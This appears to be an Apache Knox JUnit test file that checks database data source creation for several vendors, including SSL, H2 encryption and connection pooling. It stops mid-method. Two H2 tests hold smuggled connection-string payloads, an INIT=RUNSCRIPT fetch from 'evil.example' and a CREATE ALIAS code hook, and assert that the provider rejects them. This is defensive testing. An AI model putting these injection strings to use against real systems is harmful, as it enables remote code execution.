/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.apache.knox.gateway.database;

import com.mysql.cj.jdbc.MysqlDataSource;
import com.zaxxer.hikari.HikariDataSource;
import oracle.jdbc.pool.OracleDataSource;
import org.apache.knox.gateway.config.GatewayConfig;
import org.apache.knox.gateway.services.security.AliasService;
import org.apache.knox.gateway.services.security.AliasServiceException;
import org.easymock.EasyMock;
import org.h2.jdbcx.JdbcDataSource;
import org.junit.After;
import org.junit.Test;
import org.mariadb.jdbc.MariaDbDataSource;
import org.postgresql.ds.PGSimpleDataSource;
import org.postgresql.ssl.NonValidatingFactory;

import javax.sql.DataSource;
import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.concurrent.TimeUnit;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNotSame;
import static org.junit.Assert.assertNull;
import static org.junit.Assert.assertSame;
import static org.junit.Assert.assertThrows;
import static org.junit.Assert.assertTrue;

public class DataSourceProviderTest {

  @After
  public void tearDown() {
    DataSourceProvider.closeConnectionPools();
  }

  @Test
  public void shouldReturnPostgresDataSource() throws Exception {
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.POSTGRESQL.type()).anyTimes();
    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(EasyMock.anyString())).andReturn(null).anyTimes();
    EasyMock.replay(gatewayConfig, aliasService);
    assertTrue(DataSourceProvider.getDataSource(gatewayConfig, aliasService) instanceof PGSimpleDataSource);
  }

  @Test
  public void postgresDataSourceShouldHaveProperConnectionProperties() throws Exception {
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    setBasicPostgresExpectations(gatewayConfig, aliasService);
    EasyMock.replay(gatewayConfig, aliasService);
    final PGSimpleDataSource dataSource = (PGSimpleDataSource) DataSourceProvider.getDataSource(gatewayConfig, aliasService);
    assertEquals("localhost", dataSource.getServerNames()[0]);
    assertEquals(5432, dataSource.getPortNumbers()[0]);
    assertEquals("sampleDatabase", dataSource.getDatabaseName());
    assertEquals("user", dataSource.getUser());
    assertEquals("password", dataSource.getPassword());
    assertFalse(dataSource.isSsl());
  }

  private void setBasicPostgresExpectations(GatewayConfig gatewayConfig, AliasService aliasService) throws AliasServiceException {
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.POSTGRESQL.type()).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseHost()).andReturn("localhost").anyTimes();
    EasyMock.expect(gatewayConfig.getDatabasePort()).andReturn(5432).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseName()).andReturn("sampleDatabase");
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.DATABASE_USER_ALIAS_NAME)).andReturn("user".toCharArray()).anyTimes();
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.DATABASE_PASSWORD_ALIAS_NAME)).andReturn("password".toCharArray()).anyTimes();
  }

  @Test
  public void testPostgreSqlSslEnabledVerificationDisabled() throws Exception {
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    setBasicPostgresExpectations(gatewayConfig, aliasService);

    //SSL config expectations
    EasyMock.expect(gatewayConfig.isDatabaseSslEnabled()).andReturn(true).anyTimes();
    EasyMock.expect(gatewayConfig.verifyDatabaseSslServerCertificate()).andReturn(false).anyTimes();

    EasyMock.replay(gatewayConfig, aliasService);
    final PGSimpleDataSource dataSource = (PGSimpleDataSource) DataSourceProvider.getDataSource(gatewayConfig, aliasService);
    assertTrue(dataSource.isSsl());
    assertNull(dataSource.getSslRootCert());
    assertEquals(dataSource.getSslfactory(), NonValidatingFactory.class.getCanonicalName());
    EasyMock.verify(gatewayConfig, aliasService);
  }

  @Test
  public void testPostgreSqlSslEnabledVerificationEnabled() throws Exception {
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    setBasicPostgresExpectations(gatewayConfig, aliasService);

    //SSL config expectations
    EasyMock.expect(gatewayConfig.isDatabaseSslEnabled()).andReturn(true).anyTimes();
    EasyMock.expect(gatewayConfig.verifyDatabaseSslServerCertificate()).andReturn(true).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseSslTruststoreFileName()).andReturn("/sample/file/path").anyTimes();
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.DATABASE_TRUSTSTORE_PASSWORD_ALIAS_NAME)).andReturn("password".toCharArray()).anyTimes();

    EasyMock.replay(gatewayConfig, aliasService);
    final PGSimpleDataSource dataSource = (PGSimpleDataSource) DataSourceProvider.getDataSource(gatewayConfig, aliasService);
    assertTrue(dataSource.isSsl());
    assertEquals(dataSource.getSslRootCert(), "/sample/file/path");
    EasyMock.verify(gatewayConfig, aliasService);
  }

  @Test
  public void testGetPostgreSqlDatasourceFromJdbcConnectionUrl() throws Exception {
    final String connectionUrl = "jdbc:postgresql://postgresql_host:1234/testDb?user=smolnar&password=secret&ssl=true&sslmode=verify-ca&sslrootcert=/var/lib/knox/gateway/conf/postgresql/root.crt";
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.DATABASE_USER_ALIAS_NAME)).andReturn(null).anyTimes();
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.DATABASE_PASSWORD_ALIAS_NAME)).andReturn(null).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.POSTGRESQL.type()).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseConnectionUrl()).andReturn(connectionUrl).anyTimes();
    EasyMock.replay(gatewayConfig, aliasService);
    final PGSimpleDataSource dataSource = (PGSimpleDataSource) DataSourceProvider.getDataSource(gatewayConfig, aliasService);
    assertEquals("postgresql_host", dataSource.getServerNames()[0]);
    assertEquals(1234, dataSource.getPortNumbers()[0]);
    assertEquals("testDb", dataSource.getDatabaseName());
    assertEquals("smolnar", dataSource.getUser());
    assertEquals("secret", dataSource.getPassword());
    assertTrue(dataSource.isSsl());
    assertEquals(dataSource.getSslRootCert(), "/var/lib/knox/gateway/conf/postgresql/root.crt");
    EasyMock.verify(gatewayConfig);
  }

  @Test
  public void shouldReturnH2DataSource() throws Exception {
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.H2.type()).anyTimes();
    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(EasyMock.anyString())).andReturn(null).anyTimes();
    EasyMock.replay(gatewayConfig, aliasService);
    assertTrue(DataSourceProvider.getDataSource(gatewayConfig, aliasService) instanceof JdbcDataSource);
  }

  @Test
  public void h2DataSourceShouldHaveProperConnectionProperties() throws Exception {
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.H2.type()).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseName()).andReturn("sampleDatabase").anyTimes();
    EasyMock.expect(gatewayConfig.isDatabaseH2EncryptionEnabled()).andReturn(false).anyTimes();
    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.DATABASE_USER_ALIAS_NAME)).andReturn("user".toCharArray()).anyTimes();
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.DATABASE_PASSWORD_ALIAS_NAME)).andReturn("password".toCharArray()).anyTimes();
    EasyMock.replay(gatewayConfig, aliasService);
    final JdbcDataSource dataSource = (JdbcDataSource) DataSourceProvider.getDataSource(gatewayConfig, aliasService);
    assertEquals("jdbc:h2:sampleDatabase", dataSource.getUrl());
    assertEquals("user", dataSource.getUser());
    assertEquals("password", dataSource.getPassword());
  }

  @Test
  public void h2EncryptionEnabledAppendsCipherAndFilePassword() throws Exception {
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.H2.type()).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseName()).andReturn("sampleDatabase").anyTimes();
    EasyMock.expect(gatewayConfig.isDatabaseH2EncryptionEnabled()).andReturn(true).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseH2EncryptionPassphraseAlias()).andReturn(AbstractDataSourceFactory.H2_ENCRYPTION_PASSPHRASE_ALIAS_NAME).anyTimes();
    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.DATABASE_USER_ALIAS_NAME)).andReturn("user".toCharArray()).anyTimes();
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.DATABASE_PASSWORD_ALIAS_NAME)).andReturn("password".toCharArray()).anyTimes();
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.H2_ENCRYPTION_PASSPHRASE_ALIAS_NAME)).andReturn("filePass".toCharArray()).anyTimes();
    EasyMock.replay(gatewayConfig, aliasService);
    final JdbcDataSource dataSource = (JdbcDataSource) DataSourceProvider.getDataSource(gatewayConfig, aliasService);
    assertEquals("jdbc:h2:sampleDatabase;CIPHER=AES", dataSource.getUrl());
    assertEquals("user", dataSource.getUser());
    // H2 splits the connection password on the first space: <filePassword> <userPassword>.
    assertEquals("filePass password", dataSource.getPassword());
  }

  @Test
  public void h2EncryptionEnabledWithoutPassphraseFailsFast() throws Exception {
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.H2.type()).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseName()).andReturn("sampleDatabase").anyTimes();
    EasyMock.expect(gatewayConfig.isDatabaseH2EncryptionEnabled()).andReturn(true).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseH2EncryptionPassphraseAlias()).andReturn(AbstractDataSourceFactory.H2_ENCRYPTION_PASSPHRASE_ALIAS_NAME).anyTimes();
    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(EasyMock.anyString())).andReturn(null).anyTimes();
    EasyMock.replay(gatewayConfig, aliasService);
    assertThrows(SQLException.class, () -> DataSourceProvider.getDataSource(gatewayConfig, aliasService));
  }

  @Test
  public void h2DatabaseNameWithValidConnectionSettingsIsAccepted() throws Exception {
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.H2.type()).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseName()).andReturn("mem:knox;DB_CLOSE_DELAY=-1").anyTimes();
    EasyMock.expect(gatewayConfig.isDatabaseH2EncryptionEnabled()).andReturn(false).anyTimes();
    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(EasyMock.anyString())).andReturn(null).anyTimes();
    EasyMock.replay(gatewayConfig, aliasService);
    final JdbcDataSource dataSource = (JdbcDataSource) DataSourceProvider.getDataSource(gatewayConfig, aliasService);
    assertEquals("jdbc:h2:mem:knox;DB_CLOSE_DELAY=-1", dataSource.getUrl());
  }

  @Test
  public void h2DatabaseNameWithInitRunscriptIsRejected() throws Exception {
    assertH2DatabaseNameRejected("mem:knox;INIT=RUNSCRIPT FROM 'http://evil.example/x.sql'");
  }

  @Test
  public void h2DatabaseNameWithCreateAliasIsRejected() throws Exception {
    assertH2DatabaseNameRejected("mem:knox;init=CREATE ALIAS EXEC AS 'String x() { return \"\"; }'");
  }

  private void assertH2DatabaseNameRejected(String databaseName) throws Exception {
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.H2.type()).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseName()).andReturn(databaseName).anyTimes();
    EasyMock.expect(gatewayConfig.isDatabaseH2EncryptionEnabled()).andReturn(false).anyTimes();
    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(EasyMock.anyString())).andReturn(null).anyTimes();
    EasyMock.replay(gatewayConfig, aliasService);
    assertThrows(SQLException.class, () -> DataSourceProvider.getDataSource(gatewayConfig, aliasService));
  }

  @Test
  public void shouldReturnMySqlDataSource() throws Exception {
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.MYSQL.type()).anyTimes();
    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(EasyMock.anyString())).andReturn(null).anyTimes();
    EasyMock.replay(gatewayConfig, aliasService);
    assertTrue(DataSourceProvider.getDataSource(gatewayConfig, aliasService) instanceof MysqlDataSource);
  }

  @Test
  public void testMysqlDataSourceShouldHaveProperConnectionProperties() throws Exception {
    GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.MYSQL.type()).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseHost()).andReturn("localhost").anyTimes();
    EasyMock.expect(gatewayConfig.getDatabasePort()).andReturn(5432).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseName()).andReturn("sampleDatabase");
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.DATABASE_USER_ALIAS_NAME)).andReturn("user".toCharArray()).anyTimes();
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.DATABASE_PASSWORD_ALIAS_NAME)).andReturn("password".toCharArray()).anyTimes();
    EasyMock.replay(gatewayConfig, aliasService);
    MysqlDataSource dataSource = (MysqlDataSource) DataSourceProvider.getDataSource(gatewayConfig, aliasService);
    assertEquals("localhost", dataSource.getServerName());
    assertEquals(5432, dataSource.getPortNumber());
    assertEquals("sampleDatabase", dataSource.getDatabaseName());
    assertEquals("user", dataSource.getUser());
    assertEquals("password", dataSource.getPassword());
    assertTrue(dataSource.getUseSSL());
    EasyMock.verify(gatewayConfig);
  }

  @Test
  public void mysqlDataSourceShouldHaveProperSslConnectionProperties() throws Exception {
    GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.MYSQL.type()).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseHost()).andReturn("localhost").anyTimes();
    EasyMock.expect(gatewayConfig.getDatabasePort()).andReturn(3306).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseName()).andReturn("sampleDatabase");
    EasyMock.expect(gatewayConfig.isDatabaseSslEnabled()).andReturn(true).anyTimes();
    EasyMock.expect(gatewayConfig.verifyDatabaseSslServerCertificate()).andReturn(true).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseSslTruststoreFileName()).andReturn("/path/to/truststore").anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseSslTruststoreType()).andReturn("BCFKS").anyTimes();

    EasyMock.replay(gatewayConfig, aliasService);
    MysqlDataSource dataSource = (MysqlDataSource) DataSourceProvider.getDataSource(gatewayConfig, aliasService);
    assertTrue(dataSource.getUseSSL());
    assertEquals("BCFKS", dataSource.getTrustCertificateKeyStoreType());
    assertEquals("file:/path/to/truststore", dataSource.getTrustCertificateKeyStoreUrl());
  }

  @Test
  public void testGetMySqlDatasourceFromJdbcConnectionUrl() throws Exception {
    String connectionUrl = "jdbc:mysql://mysql_host:1234/testDb?user=user&password=secret&ssl=true&sslmode=verify-ca&sslrootcert=/var/lib/knox/gateway/conf/postgresql/root.crt";
    GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.MYSQL.type()).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseConnectionUrl()).andReturn(connectionUrl).anyTimes();
    EasyMock.replay(gatewayConfig);
    MysqlDataSource dataSource = (MysqlDataSource) DataSourceProvider.getDataSource(gatewayConfig, null);
    assertEquals(connectionUrl, dataSource.getUrl());
    EasyMock.verify(gatewayConfig);
  }

  @Test
  public void shouldReturnMariaDbDatasource() throws Exception {
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.MARIADB.type()).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseConnectionUrl()).andReturn("jdbc:mariadb://localhost:1234").anyTimes();
    EasyMock.replay(gatewayConfig);
    assertTrue(DataSourceProvider.getDataSource(gatewayConfig, null) instanceof MariaDbDataSource);
  }

  @Test
  public void shoulFailToReturnMariaDbDatasourceIfConnectionUrlIsMissing() throws Exception {
    testMariaDbFailure("MariaDB Java Datasource requires a connection string!", null);
  }

  @Test
  public void shoulFailToReturnMariaDbDatasourceIfConnectionUrlIsWrong() throws Exception {
    final String wrongConnectionUrl = "jdbc:mariadbb://localhost:1234"; // typo in the protocol
    testMariaDbFailure("Wrong mariaDB url: " + wrongConnectionUrl, wrongConnectionUrl);
  }

  private void testMariaDbFailure(String expectedError, String connectionUrl) {
    boolean error = false;
    try {
      final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
      EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.MARIADB.type()).anyTimes();
      if (connectionUrl != null) {
        EasyMock.expect(gatewayConfig.getDatabaseConnectionUrl()).andReturn(connectionUrl).anyTimes();
      }
      EasyMock.replay(gatewayConfig);
      DataSourceProvider.getDataSource(gatewayConfig, null);
    } catch (Exception e) {
      error = true;
      assertEquals(expectedError, e.getMessage());
    }
    assertTrue(error);
  }

  @Test
  public void shouldReturnOracleDataSource() throws Exception {
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.ORACLE.type()).anyTimes();
    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(EasyMock.anyString())).andReturn(null).anyTimes();
    EasyMock.replay(gatewayConfig, aliasService);
    assertTrue(DataSourceProvider.getDataSource(gatewayConfig, aliasService) instanceof OracleDataSource);
  }

  @Test
  public void oracleDataSourceShouldHaveProperConnectionProperties() throws Exception {
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    setBasicOracleExpectations(gatewayConfig, aliasService);
    EasyMock.replay(gatewayConfig, aliasService);
    final OracleDataSource dataSource = (OracleDataSource) DataSourceProvider.getDataSource(gatewayConfig, aliasService);
    assertEquals("localhost", dataSource.getServerName());
    assertEquals(1521, dataSource.getPortNumber());
    assertEquals("sampleDatabase", dataSource.getServiceName());
    assertEquals("user", dataSource.getUser());
  }

  @Test
  public void testGetOracleDatasourceFromJdbcConnectionUrl() throws Exception {
    final String connectionUrl = "jdbc:oracle:thin:testuser/testpw@oracle_host:1521/TESTDB";
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.DATABASE_USER_ALIAS_NAME)).andReturn(null).anyTimes();
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.DATABASE_PASSWORD_ALIAS_NAME)).andReturn(null).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.ORACLE.type()).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseConnectionUrl()).andReturn(connectionUrl).anyTimes();
    EasyMock.replay(gatewayConfig, aliasService);
    final OracleDataSource dataSource = (OracleDataSource) DataSourceProvider.getDataSource(gatewayConfig, aliasService);
    assertNull(dataSource.getUser());
    assertEquals(0, dataSource.getPortNumber());
    assertNull(dataSource.getServerName());
    assertNull(dataSource.getServiceName());
    assertEquals("jdbc:oracle:thin:testuser/testpw@oracle_host:1521/TESTDB", dataSource.getURL());
    EasyMock.verify(gatewayConfig);
  }

  @Test
  public void oracleDataSourceShouldHaveProperSslConnectionProperties() throws Exception {
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    final AliasService aliasService = EasyMock.createNiceMock(AliasService.class);
    setBasicOracleExpectations(gatewayConfig, aliasService);
    EasyMock.expect(gatewayConfig.isDatabaseSslEnabled()).andReturn(true).anyTimes();
    EasyMock.expect(gatewayConfig.verifyDatabaseSslServerCertificate()).andReturn(true).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseSslTruststoreFileName()).andReturn("/path/to/truststore").anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseSslTruststoreType()).andReturn("BCFKS").anyTimes();
    EasyMock.replay(gatewayConfig, aliasService);
    final OracleDataSource dataSource = (OracleDataSource) DataSourceProvider.getDataSource(gatewayConfig, aliasService);
    assertEquals("tcps", dataSource.getNetworkProtocol());
    assertEquals("/path/to/truststore", dataSource.getConnectionProperty("javax.net.ssl.trustStore"));
    assertEquals("BCFKS", dataSource.getConnectionProperty("javax.net.ssl.trustStoreType"));
    //Can't validate the truststore password because oracle datasource doesn't return it.
  }

  private void setBasicOracleExpectations(GatewayConfig gatewayConfig, AliasService aliasService) throws AliasServiceException {
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.ORACLE.type()).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseHost()).andReturn("localhost").anyTimes();
    EasyMock.expect(gatewayConfig.getDatabasePort()).andReturn(1521).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseName()).andReturn("sampleDatabase");
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.DATABASE_USER_ALIAS_NAME)).andReturn("user".toCharArray()).anyTimes();
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.DATABASE_PASSWORD_ALIAS_NAME)).andReturn("password".toCharArray()).anyTimes();
    EasyMock.expect(aliasService.getPasswordFromAliasForGateway(AbstractDataSourceFactory.DATABASE_TRUSTSTORE_PASSWORD_ALIAS_NAME)).andReturn("ts_password".toCharArray()).anyTimes();
  }

  @Test
  public void pooledDataSourceShouldWrapVendorDataSourceWithConfiguredSettings() throws Exception {
    final GatewayConfig gatewayConfig = createPooledH2Config("mem:pooledSettings;DB_CLOSE_DELAY=-1");
    final AliasService aliasService = createAliasService("user", "password");

    final DataSource dataSource = DataSourceProvider.getDataSource(gatewayConfig, aliasService);
    assertTrue(dataSource instanceof HikariDataSource);
    final HikariDataSource pool = (HikariDataSource) dataSource;
    assertTrue(pool.getDataSource() instanceof JdbcDataSource);
    assertEquals("jdbc:h2:mem:pooledSettings;DB_CLOSE_DELAY=-1", ((JdbcDataSource) pool.getDataSource()).getUrl());
    assertEquals(4, pool.getMaximumPoolSize());
    assertEquals(1, pool.getMinimumIdle());
    assertEquals(5000L, pool.getConnectionTimeout());
    assertEquals(20000L, pool.getIdleTimeout());
    assertEquals(60000L, pool.getMaxLifetime());

    try (Connection connection = pool.getConnection(); Statement statement = connection.createStatement();
         ResultSet resultSet = statement.executeQuery("SELECT 1")) {
      assertTrue(resultSet.next());
      assertEquals(1, resultSet.getInt(1));
    }
  }

  @Test
  public void pooledDataSourceShouldBeSharedForIdenticalSettings() throws Exception {
    final DataSource first = DataSourceProvider.getDataSource(createPooledH2Config("mem:sharedPool;DB_CLOSE_DELAY=-1"), createAliasService("user", "password"));
    final DataSource second = DataSourceProvider.getDataSource(createPooledH2Config("mem:sharedPool;DB_CLOSE_DELAY=-1"), createAliasService("user", "password"));
    assertSame(first, second);
  }

  @Test
  public void pooledDataSourceShouldNotBeSharedForDifferentSettings() throws Exception {
    final DataSource dataSource = DataSourceProvider.getDataSource(createPooledH2Config("mem:poolA;DB_CLOSE_DELAY=-1"), createAliasService("alice", "password"));
    assertNotSame(dataSource, DataSourceProvider.getDataSource(createPooledH2Config("mem:poolB;DB_CLOSE_DELAY=-1"), createAliasService("alice", "password")));

    // Pools connect when created, so the other credentials must be valid for the database.
    try (Connection connection = dataSource.getConnection(); Statement statement = connection.createStatement()) {
      statement.execute("CREATE USER bob PASSWORD 'password' ADMIN");
      statement.execute("ALTER USER alice SET PASSWORD 'otherPassword'");
    }
    assertNotSame(dataSource, DataSourceProvider.getDataSource(createPooledH2Config("mem:poolA;DB_CLOSE_DELAY=-1"), createAliasService("bob", "password")));
    assertNotSame(dataSource, DataSourceProvider.getDataSource(createPooledH2Config("mem:poolA;DB_CLOSE_DELAY=-1"), createAliasService("alice", "otherPassword")));
  }

  @Test
  public void closeConnectionPoolsShouldCloseAndForgetPools() throws Exception {
    final GatewayConfig gatewayConfig = createPooledH2Config("mem:closedPool;DB_CLOSE_DELAY=-1");
    final AliasService aliasService = createAliasService("user", "password");
    final HikariDataSource pool = (HikariDataSource) DataSourceProvider.getDataSource(gatewayConfig, aliasService);

    DataSourceProvider.closeConnectionPools();
    assertTrue(pool.isClosed());

    final HikariDataSource newPool = (HikariDataSource) DataSourceProvider.getDataSource(gatewayConfig, aliasService);
    assertNotSame(pool, newPool);
    assertFalse(newPool.isClosed());
  }

  @Test
  public void pooledDataSourceShouldFailFastWhenDatabaseIsUnreachable() throws Exception {
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.POSTGRESQL.type()).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseConnectionUrl()).andReturn("jdbc:postgresql://localhost:1/unreachable").anyTimes();
    expectPoolSettings(gatewayConfig);
    EasyMock.replay(gatewayConfig);
    final AliasService aliasService = createAliasService("user", "password");

    // Fails well before the 5 s connection timeout instead of waiting it out.
    final long start = System.nanoTime();
    assertThrows(SQLException.class, () -> DataSourceProvider.getDataSource(gatewayConfig, aliasService));
    assertTrue(System.nanoTime() - start < TimeUnit.MILLISECONDS.toNanos(5000L));

    // The failed pool is not cached: the next caller tries to connect again.
    assertThrows(SQLException.class, () -> DataSourceProvider.getDataSource(gatewayConfig, aliasService));
  }

  @Test
  public void poolingCanBeDisabled() throws Exception {
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.H2.type()).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseName()).andReturn("mem:unpooled;DB_CLOSE_DELAY=-1").anyTimes();
    EasyMock.expect(gatewayConfig.isDatabaseConnectionPoolEnabled()).andReturn(false).anyTimes();
    EasyMock.replay(gatewayConfig);

    final DataSource dataSource = DataSourceProvider.getDataSource(gatewayConfig, createAliasService("user", "password"));
    assertTrue(dataSource instanceof JdbcDataSource);
    assertNotSame(dataSource, DataSourceProvider.getDataSource(gatewayConfig, createAliasService("user", "password")));
  }

  private GatewayConfig createPooledH2Config(String databaseName) {
    final GatewayConfig gatewayConfig = EasyMock.createNiceMock(GatewayConfig.class);
    EasyMock.expect(gatewayConfig.getDatabaseType()).andReturn(DatabaseType.H2.type()).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseName()).andReturn(databaseName).anyTimes();
    EasyMock.expect(gatewayConfig.isDatabaseH2EncryptionEnabled()).andReturn(false).anyTimes();
    expectPoolSettings(gatewayConfig);
    EasyMock.replay(gatewayConfig);
    return gatewayConfig;
  }

  private void expectPoolSettings(GatewayConfig gatewayConfig) {
    EasyMock.expect(gatewayConfig.isDatabaseConnectionPoolEnabled()).andReturn(true).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseConnectionPoolMaxSize()).andReturn(4).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseConnectionPoolMinIdle()).andReturn(1).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseConnectionPoolConnectionTimeout()).andReturn(5000L).anyTimes();
    EasyMock.expect(gatewayConfig.getDatabaseConnectionPoolIdleTimeout()).andReturn(20000L).anyTimes();
